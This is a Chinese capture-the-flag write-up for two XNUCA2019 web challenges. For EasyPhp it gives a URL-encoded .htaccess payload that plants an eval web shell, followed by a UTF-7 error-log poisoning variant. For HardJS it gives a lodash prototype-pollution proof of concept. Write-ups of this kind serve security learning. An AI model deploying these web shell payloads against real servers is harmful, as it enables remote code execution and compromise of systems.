# [XNUCA2019Qualifier] 

## EasyPhp

进入直接给了源码

```php
<?php
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    include_once("fl3g.php");
    if(!isset($_GET['content']) || !isset($_GET['filename'])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET['content'];
    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
        echo "Hacker";
        die();
    }
    $filename = $_GET['filename'];
    if(preg_match("/[^a-z\.]/", $filename) == 1) {
        echo "Hacker";
        die();
    }
    $files = scandir('./'); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== "index.php") {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . "\nJust one chance");
?>
```

大致就是先删除当前目录下非index.php的文件后``include('fl3g.php')``，之后获取filename和content并写入文件中。其中对filename和content都有过滤。filename只能由a-z和单引号构成，并且文件内容结尾还被加上了一行

看了一下能不能直接用``"\"``绕过``flag``，结果发现上传的php后缀文件并不能被正常解析??

看来还是要搞``.htaccess``，但是这里只能上传一次文件....

直接把``.htaccess``解析了就可了

因为这里``if(preg_match("/[^a-z\.]/", $filename) == 1)``

这里可以利用``prce``参数绕过``preg_match``(返回``FALSE``)

```
php_value pcre.backtrack_limit 0
php_value pcre.jit 0 
```

可以利用``#\``绕过``\n``

但是搞``.htaccess``的时候因为URL编码的问题buuoj炸了好几次。。。。

最终payload

```
/?filename=.htaccess&content=filename=.htaccess&content=php_value%20auto_prepend_fi%5c%0ale%20%22.htaccess%22%0a%23%3c%3fphp%20%40eval(%24_REQUEST%5b'eki'%5d)%3b%20%3f%3e%5c
```

用蚁剑连上就可以拿flag了

看了大佬的wp，预期解是php的配置选项中有include_path可以用来设置include的路径

这样就可以利用``include_once("fl3g.php");``了

还是利用``.htaccess``

```
php_value include_path "/tmp"
```

我们首先要在``/tmp``下生成``fl3g.php``,利用apache的log功能

```
php_value error_log /tmp/fl3g.php
php_value error_reporting 32767
php_value include_path "+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs"
# \
```

>这里的``error_reporting 32767``是为了输出所有的错误信息
>https://www.php.net/manual/zh/errorfunc.constants.php

```php
mb_convert_encoding('<?php eval($_GET[1]); ?>',"utf-7");
//+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+AD
```

是采用utf7编码的poc,用来绕过html编码。

然后调用

```
php_value include_path "/tmp"
php_value zend.multibyte 1
php_value zend.script_encoding "UTF-7"
# \
```

## 参考资料

[https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp](https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp)

## HardJS

nodejs原型链污染

用``npm audit``分析源码

发现是``lodash``的一个CVE ``CVE-2019-10744``

利用点是

```js
for(var i=0;i<raws.length ;i++){
    lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));

    var sql = "delete from `html` where id = ?";
    var result = await query(sql,raws[i].id);
}
```

```Poc
{"type":"test","content":{"prototype":{"constructor":{"a":"b"}}}}
```
在合并时便会在Object上附加a=b这样一个属性，任意不存在a属性的原型为Object的对象在访问其a属性时均会获取到b属性